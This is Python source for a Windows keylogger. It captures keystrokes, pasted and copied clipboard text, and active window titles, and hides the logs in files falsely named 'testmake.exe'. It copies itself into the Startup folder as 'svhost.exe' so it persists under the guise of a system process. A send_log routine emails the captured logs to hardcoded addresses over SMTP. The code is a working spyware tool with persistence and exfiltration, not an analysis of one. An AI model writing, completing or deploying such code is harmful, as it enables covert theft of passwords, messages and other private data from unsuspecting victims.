from logging import getLogger, Formatter, FileHandler, INFO
from threading import Thread
from win32gui import GetWindowText, GetForegroundWindow
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from win32api import SetFileAttributes
from pynput.keyboard import Key, Listener
from time import sleep
from sys import argv
from os import getlogin, getenv, path
from cryptography import fernet
import smtplib
from email.message import EmailMessage

def win_main():
    clipboard_thread = Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    with Listener(on_press=press)as listener:
        listener.join()

def press(key):
    global last_keys
    if key == Key.enter:
        logger1.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
        logger2.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
    else:
        try:
            if last_keys[-1] == Key.ctrl_l and key.char == 'v':
                logger1.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
                logger2.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
        except (AttributeError, IndexError):
            pass

    logger1.info(key)
    logger2.info(key)

    if  len(last_keys) > 50:
        last_keys.clear()

    last_keys.append(key)

def setup_logger(title, path, formatter="%(name)s:%(asctime)s:\t\t%(message)s", level=INFO):
    formatter = Formatter(formatter)
    handler = FileHandler(path)
    handler.setFormatter(formatter)
    logger = getLogger(title)
    logger.setLevel(level)
    logger.addHandler(handler)
    return logger

def get_current_windows():
    return GetWindowText(GetForegroundWindow())

def get_clipboard_data():
    try:
        OpenClipboard()
        data = None
        try:
            data = GetClipboardData()
        except TypeError:
            pass
        finally:
            CloseClipboard()
        return data
    except:
        pass

def monitor_clipboard():
    data = None
    while True:
        if data != get_clipboard_data():
            data = get_clipboard_data()
            logger1.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
            logger2.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
        sleep(1)

def ensure_startup():
    paths = ["C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svhost.exe",
             getenv("TEMP") + "\\testmake.exe",
             getenv("APPDATA") + "\\testmake.exe"]

    if not path.exists(paths[0]):
        with open(argv[0], "rb")as file:
            byt = file.read()

        with open(paths[0], "wb")as file:
            file.write(byt)
        SetFileAttributes(paths[0], 2)

    for p in paths[1:]:
        if not path.exists(p):
            with open(p, "wb")as _:
                pass
            SetFileAttributes(p, 2)
    return paths[1:]

def send_log():
    with open(paths[0], "rb")as f:
        c1 = f.read()
    with open(paths[1], "rb")as f:
        c2 = f.read()

    email = "LuckyLuke1200@gmx.de"


    msg = EmailMessage()
    msg['From'] = email
    msg['To'] = "schlusseldieb@gmail.com"

    msg.add_attachment(c1, maintype="application", subtype="executable")

    with smtplib.SMTP_SSL("mail.gmx.net", 587)as f:
        f.login(email, pw)
        f.send(msg)


#paths = ensure_startup()
paths =[getenv("TEMP") + "\\testmake.exe", getenv("APPDATA") + "\\testmake.exe"]
last_keys = []
logger1 = setup_logger("1", paths[0])
logger2 = setup_logger("2", paths[1])
send_log()
#win_main()

